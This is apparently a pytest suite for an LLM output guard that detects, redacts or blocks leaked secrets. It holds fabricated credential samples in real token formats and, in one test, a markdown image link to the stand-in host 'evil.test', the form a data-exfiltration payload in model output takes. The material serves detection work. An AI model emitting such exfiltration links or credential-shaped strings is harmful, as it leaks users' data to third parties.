"""LLM02: known-format secret rules + generic (entropy) secret scan."""
import pytest

from app.pipeline.output_handling import (
    OutputHandlingPolicy, handle_output, validate_section,
)
from app.pipeline.rules import RuleEngine
from app.pipeline.secret_scan import REDACTION, find_secrets, shannon_entropy
from pathlib import Path
import app

RULES = Path(app.__file__).parent / "rules"

KNOWN = {
    "github_fine_grained_token": "github_pat_" + "A1b2C3d4E5" * 6,
    "gitlab_token": "glpat-" + "a1B2c3D4e5F6g7H8i9J0",
    "slack_token": "xoxb-1234567890-abcdefghij",
    "slack_webhook": "https://hooks.slack.com/services/T0123ABC/B0123ABC/abcDEF123456",
    "stripe_key": "sk_live_" + "a1B2c3D4e5F6g7H8",
    "google_api_key": "AIza" + "Sy" + "A" * 33,
    "huggingface_token": "hf_" + "aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3h",
    "npm_token": "npm_" + "aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3hJk",
    "aws_temp_access_key": "ASIA" + "ABCDEFGHIJKLMNOP",
    "jwt": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r",
    "credentials_in_url": "postgres://admin:hunter2pass@db.internal:5432/app",
    "private_key_block": "-----BEGIN ENCRYPTED PRIVATE KEY-----",
}


@pytest.mark.parametrize("pack", ["default.yaml", "output.yaml"])
@pytest.mark.parametrize("rule_id,sample", KNOWN.items())
def test_known_formats_blocked(pack, rule_id, sample):
    res = RuleEngine(rules_path=RULES / pack).check(f"here you go: {sample} enjoy")
    assert rule_id in res.violations


@pytest.mark.parametrize("text", [
    "Use https://example.com/path and ssh://git@github.com/repo.",
    "Connect with postgres://user@host/db (no password).",
    "The token is stored in the vault.",
])
def test_known_format_no_false_positive(text):
    assert RuleEngine(rules_path=RULES / "output.yaml").check(text).passed


# ------------------------------------------------------------- entropy scan
@pytest.mark.parametrize("text", [
    'api_key = "Zk8fQ2xP9mTn4VbL7wRc"',
    "password: Xq7!pL2#vN9zKd4m",
    'export SECRET_TOKEN=a8F3kP0zQw9XnV2mB7yR',
    "The key is 8fK2Qx9PmT4vNbL7wRcZ3yH6jD1sAe0U",  # standalone high-entropy
])
def test_detects(text):
    assert find_secrets(text)


@pytest.mark.parametrize("text", [
    'api_key = "your-api-key-here"',
    "password: <your password>",
    "token = os.environ['API_TOKEN']",
    "export TOKEN=${TOKEN_VALUE_FROM_CI}",
    "commit 3f786850e387550fdab836ed7e6dc881de23001b fixed it",  # git sha
    "id 123e4567-e89b-12d3-a456-426614174000",                    # uuid
    "sha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "Set a strong password with at least twelve characters.",
    "internationalizationconfigurationmanagement is a long word indeed",
    "api_key = ",
])
def test_ignores(text):
    assert find_secrets(text) == []


def test_entropy_ordering():
    assert shannon_entropy("aaaaaaaa") == 0
    assert shannon_entropy("aB3$xY9!") > shannon_entropy("abababab")


# ------------------------------------------------------------ handle_output
SECRET = 'config: api_key = "Zk8fQ2xP9mTn4VbL7wRc" ok'


def test_default_flags_for_review():
    r = handle_output(SECRET, OutputHandlingPolicy())
    assert r.review and not r.blocked and "secret" in r.findings
    assert r.text == SECRET


def test_redact():
    r = handle_output(SECRET, OutputHandlingPolicy(secrets="redact"))
    assert REDACTION in r.text and "Zk8f" not in r.text
    assert "redact_secret" in r.actions and not r.blocked


def test_block():
    assert handle_output(SECRET, OutputHandlingPolicy(secrets="block")).blocked


def test_allow():
    r = handle_output(SECRET, OutputHandlingPolicy(secrets="allow"))
    assert not r.review and r.findings == []


def test_redact_then_other_stages_still_run():
    r = handle_output(
        f"{SECRET} ![x](https://evil.test/?d=1)", OutputHandlingPolicy(secrets="redact")
    )
    assert REDACTION in r.text and "evil.test" not in r.text


def test_policy_section_validation():
    validate_section("p", {"secrets": "redact"})
    with pytest.raises(ValueError):
        validate_section("p", {"secrets": "maybe"})
    assert OutputHandlingPolicy().merged({"secrets": "block"}).secrets == "block"
